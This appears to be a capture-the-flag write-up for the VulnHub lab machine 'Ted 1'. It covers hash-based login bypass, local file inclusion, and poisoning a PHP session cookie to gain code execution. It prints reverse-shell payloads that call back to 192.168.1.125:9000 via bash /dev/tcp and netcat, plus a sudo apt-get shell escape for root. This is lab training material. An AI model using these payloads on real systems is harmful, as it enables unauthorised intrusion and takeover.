## Ted 1

https://www.vulnhub.com/entry/ted-1,327/

### www-data

#### User Authentication

We can enumerate user at `authenticate.php` and discover user admin.

If I send admin:admin at login, I get  "Password hash is not correct, make sure to hash it before submit.".

If I send admin in md5, I get "Password or password hash is not correct, make sure to hash it before submit."

If I send admin in sha256, no error is displayed, and we login in. For some reason, the hash needs to be in uppercase.

<br>

#### LFI and Log Poisoning

There is LFI at `search` with `../../../etc/passwd`. Actually, you can just put the absolute path that the file will be read: `/etc/passwd`.

We test some files until reache PHP Session Files at `/var/lib/php/sessions/sess_pd262kbl40c3gbbvstp4er3hv4`.

We see that the cookie is being reflected, so we can log poison it changing `user_pref`.
```
# This doesn't works because the semicolon is ending the cookie
<?php echo system("ls"); ?>

# Since the close tag imples a semicolon, we can't avoid remove it
<?php system("bash -c 'bash -i >& /dev/tcp/192.168.1.125/9000 0>&1'")?>

# We could have used nc
<?php system("nc 192.168.1.125 9000 -e /bin/bash")?>
```

<br>

### Privilege Escalation
```
sudo -l
(root) NOPASSWD: /usr/bin/apt-get

apt-get changelog apt
!/bin/sh
```
